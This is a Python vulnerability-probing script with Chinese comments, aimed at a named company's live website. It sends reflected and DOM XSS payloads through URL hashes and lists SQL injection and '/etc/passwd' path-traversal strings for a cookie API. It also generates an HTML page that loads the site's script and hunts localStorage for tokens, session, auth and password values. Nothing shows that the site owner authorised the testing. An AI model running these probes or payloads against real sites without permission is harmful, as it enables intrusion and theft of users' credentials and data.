#!/usr/bin/env python3
"""
测试从JS分析中发现的潜在漏洞
"""

import requests
from urllib.parse import quote

BASE_URL = "https://www.sembcorp.com"

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}

def test_email_decode_xss():
    """测试 email-decode.min.js 中的潜在XSS"""
    print("="*70)
    print("测试 1: Email Decode XSS (email-decode.min.js)")
    print("="*70)
    
    # Cloudflare邮箱编码通常通过URL hash或data属性传递
    # 测试是否可以通过hash注入
    
    test_cases = [
        "#cdn-cgi/l/email-protection#test",
        "#cdn-cgi/l/email-protection#'onerror='alert(1)",
        "#cdn-cgi/l/email-protection#\"><script>alert(1)</script>",
    ]
    
    for payload in test_cases:
        url = BASE_URL + payload
        try:
            response = requests.get(url, headers=HEADERS, timeout=10)
            
            # 检查响应中是否包含payload
            if payload.split('#')[-1] in response.text:
                print(f"[+] Payload反射: {payload[:50]}...")
                
                # 检查是否被转义
                if "<script>" in response.text and "&lt;script&gt;" not in response.text:
                    print(f"    ⚠️  未转义! 可能XSS")
                else:
                    print(f"    ❌ 已转义或被过滤")
            else:
                print(f"[-] 无反射: {payload[:30]}...")
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    print()

def test_cookie_control_injection():
    """测试 cookiecontrol.js 中的API注入"""
    print("="*70)
    print("测试 2: Cookie Control API 注入")
    print("="*70)
    
    # 测试 /umbraco/api/cookiecontrol/get 端点
    url = f"{BASE_URL}/umbraco/api/cookiecontrol/get"
    
    payloads = [
        "' OR '1'='1",
        "'; alert(1); '",
        "../../../etc/passwd",
    ]
    
    for payload in payloads:
        try:
            response = requests.get(url, headers=HEADERS, timeout=10)
            print(f"[{response.status_code}] 正常响应 (长度: {len(response.text)})")
            # 这个端点应该只返回 true/false
            if len(response.text) > 10:
                print(f"    ⚠️  响应异常长,可能有信息泄露")
            break  # 只测试一次,因为这个端点不接受参数
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    print()

def test_blacksunplc_storage():
    """测试 blacksunplc storage 库的localStorage操作"""
    print("="*70)
    print("测试 3: Storage API 滥用检测")
    print("="*70)
    
    # 这个需要在浏览器环境中测试
    # 创建HTML页面来测试
    html_content = """
<!DOCTYPE html>
<html>
<head><title>Storage Test</title></head>
<body>
<script src="https://www.sembcorp.com/js/files/blacksunplc-114430.min.js"></script>
<script>
// 测试是否可以访问敏感storage
try {
    console.log("Testing localStorage access...");
    var keys = Object.keys(localStorage);
    console.log("LocalStorage keys:", keys);
    
    // 尝试读取可能的敏感数据
    var sensitive_keys = ['token', 'session', 'auth', 'user', 'password'];
    sensitive_keys.forEach(function(key) {
        var value = localStorage.getItem(key);
        if (value) {
            console.log("FOUND:", key, "=", value);
        }
    });
} catch(e) {
    console.error("Error:", e);
}
</script>
</body>
</html>
"""
    
    with open('js/test_storage.html', 'w') as f:
        f.write(html_content)
    
    print("[+] 创建了测试页面: js/test_storage.html")
    print("    需要在浏览器中打开此页面手动测试")
    print()

def analyze_global_min_js():
    """分析 global.min.js 中的危险函数"""
    print("="*70)
    print("测试 4: global.min.js (D3.js) 危险函数分析")
    print("="*70)
    
    # 由于文件太大,我们只检查特定的危险模式
    with open('js/files/global.min.js', 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    
    dangerous_patterns = {
        'eval(': 'eval() 调用',
        'innerHTML': 'innerHTML 赋值',
        'outerHTML': 'outerHTML 赋值',
        'document.write': 'document.write 调用',
        'Function(': 'Function 构造函数',
        'setTimeout(': 'setTimeout (可能用于eval)',
    }
    
    print("\n危险模式统计:")
    for pattern, description in dangerous_patterns.items():
        count = content.count(pattern)
        if count > 0:
            print(f"  {description}: {count} 次")
    
    print("\n注意: D3.js 是可信库,这些模式可能是正常的")
    print("关键是是否有用户输入流入这些函数")
    print()

def test_dom_based_xss_via_hash():
    """测试基于Hash的DOM XSS"""
    print("="*70)
    print("测试 5: DOM-based XSS via URL Hash")
    print("="*70)
    
    # email-decode.min.js 会读取 location.hash
    # 测试是否可以通过hash注入恶意内容
    
    test_hashes = [
        "#'onmouseover='alert(1)",
        "#\"><img src=x onerror=alert(1)>",
        "#javascript:alert(1)",
    ]
    
    print("需要在浏览器中测试以下URL:")
    for hash_payload in test_hashes:
        url = BASE_URL + hash_payload
        print(f"  {url}")
    
    print("\n手动测试步骤:")
    print("  1. 在浏览器中打开上述URL")
    print("  2. 检查是否触发alert")
    print("  3. 查看Console是否有错误")
    print()

if __name__ == "__main__":
    print("\nJS文件安全漏洞测试")
    print("="*70)
    
    test_email_decode_xss()
    test_cookie_control_injection()
    test_blacksunplc_storage()
    analyze_global_min_js()
    test_dom_based_xss_via_hash()
    
    print("="*70)
    print("测试完成!")
    print("="*70)
    print("\n总结:")
    print("  1. email-decode.min.js 有潜在的DOM XSS风险")
    print("  2. blacksunplc库包含危险函数,但需要验证调用链")
    print("  3. 大部分发现需要浏览器环境验证")
    print("  4. 建议进行手动DOM XSS测试")
